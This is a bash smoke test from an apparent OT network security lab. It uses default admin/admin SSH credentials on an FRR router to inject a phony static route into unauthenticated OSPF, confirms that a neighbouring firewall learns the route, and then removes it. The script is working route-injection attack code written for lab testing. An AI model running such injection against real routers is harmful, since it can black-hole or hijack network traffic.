#!/usr/bin/env bash
# L3 surface probe. Every FRR router runs OSPF in area 0 with no MD5 auth
# and no passive-interface filter, a realistic vendor-default exposure on
# OT-grade switches and routers. The visitor's existing vtysh foothold (see
# test_vtysh_credential_stuffing) lets them edit the running config; once
# they bolt `redistribute static` onto `router ospf` and add a phony static,
# every other router in the area learns the prefix.
#
# Coverage:
#   Stage 0  skip if OSPF isn't up on inet-dmz-fw (lab needs a redeploy)
#   Stage 1  inet-dmz-fw and dmz-ent-fw are FULL OSPF neighbours
#   Stage 2  visitor injects 192.0.2.0/24 via static + redistribute on inet-dmz-fw
#   Stage 3  dmz-ent-fw learns 192.0.2.0/24 via OSPF from 10.10.5.200
#   Stage 4  cleanup: visitor removes the static and redistribute
#   Stage 5  dmz-ent-fw no longer carries the injected route
#
# Usage: bash tests/smoke/test_ospf_route_injection.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ATTACKER="unseen-gate"
ROUTER_A="10.10.0.200"           # inet-dmz-fw, the compromise point
ROUTER_B="10.10.5.201"           # dmz-ent-fw, the propagation observer
INJECTED_PREFIX="192.0.2.0/24"
INJECTED_PREFIX_RE='192\.0\.2\.0/24'

require_running "$ATTACKER"
require_running "inet-dmz-fw"
require_running "dmz-ent-fw"

echo "[ospf] Stage 0: OSPF must be running on inet-dmz-fw"
OSPF_STATE="$(ssh_password_login "$ATTACKER" admin "$ROUTER_A" admin "show ip ospf")"
if echo "$OSPF_STATE" | grep -qE 'OSPF Routing Process'; then
    ok "inet-dmz-fw has ospfd running"
else
    echo "  [skip] ospfd on inet-dmz-fw not running."
    echo "         Rebuild clab-router image and './ctl down && ./ctl up' to redeploy."
    exit 2
fi

echo "[ospf] Stage 1: OSPF adjacency to dmz-ent-fw is Full"
# Adjacency can take ~30s to converge after redeploy; poll up to 60s.
for _ in $(seq 1 60); do
    NBR="$(ssh_password_login "$ATTACKER" admin "$ROUTER_A" admin "show ip ospf neighbor")"
    echo "$NBR" | grep -E '\bFull\b' >/dev/null && break
    sleep 1
done
assert_contains "$NBR" "Full" "show ip ospf neighbor on inet-dmz-fw lists a Full neighbour"
assert_contains "$NBR" "2.2.2.2" "neighbour router-id matches dmz-ent-fw (2.2.2.2)"

# Driver function: open an interactive vtysh shell, send a config snippet,
# capture the running-config dump that comes out of `show running-config`
# at the end. Lets us inject and read-back in one round-trip.
vtysh_apply() {
    local host="$1" snippet="$2"
    docker exec "$ATTACKER" "$SSH_RUNNER_PY" -c "
import paramiko, time
c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect('$host', username='admin', password='admin', timeout=5,
          allow_agent=False, look_for_keys=False)
chan = c.invoke_shell()
def drain(t=0.4):
    time.sleep(t); out = b''
    while chan.recv_ready(): out += chan.recv(16384)
    return out.decode('utf-8', 'replace')
drain(0.5)
for line in '''$snippet'''.strip().splitlines():
    chan.send(line + '\n')
    drain(0.2)
chan.send('end\n')
drain(0.3)
chan.send('show running-config\n')
print(drain(0.6))
c.close()
" 2>&1
}

echo "[ospf] Stage 2: visitor injects $INJECTED_PREFIX via static + redistribute"
INJECT="$(vtysh_apply "$ROUTER_A" "configure terminal
ip route $INJECTED_PREFIX Null0
router ospf
 redistribute static")"
assert_contains "$INJECT" "ip route $INJECTED_PREFIX_RE" "static route present in running-config"
assert_contains "$INJECT" "redistribute static" "redistribute static present under router ospf"

echo "[ospf] Stage 3: dmz-ent-fw learns the route via OSPF"
# LSA flood + SPF re-run can take a few seconds. Poll up to 20s.
for _ in $(seq 1 20); do
    ROUTE_OSPF="$(ssh_password_login "$ATTACKER" admin "$ROUTER_B" admin "show ip route ospf")"
    echo "$ROUTE_OSPF" | grep -qE "$INJECTED_PREFIX_RE" && break
    sleep 1
done
assert_contains "$ROUTE_OSPF" "$INJECTED_PREFIX_RE" "dmz-ent-fw RIB carries 192.0.2.0/24 via OSPF"
assert_contains "$ROUTE_OSPF" "10.10.5.200"          "next-hop is inet-dmz-fw's dmz interface"

echo "[ospf] Stage 4: visitor cleans up"
CLEAN="$(vtysh_apply "$ROUTER_A" "configure terminal
router ospf
 no redistribute static
exit
no ip route $INJECTED_PREFIX Null0")"
assert_absent  "$CLEAN" "redistribute static"         "redistribute static removed from running-config"
assert_absent  "$CLEAN" "ip route $INJECTED_PREFIX_RE" "static route removed from running-config"

echo "[ospf] Stage 5: dmz-ent-fw forgets the route"
for _ in $(seq 1 20); do
    POST="$(ssh_password_login "$ATTACKER" admin "$ROUTER_B" admin "show ip route ospf")"
    echo "$POST" | grep -qE "$INJECTED_PREFIX_RE" || break
    sleep 1
done
assert_absent "$POST" "$INJECTED_PREFIX_RE" "dmz-ent-fw no longer carries 192.0.2.0/24"

summary
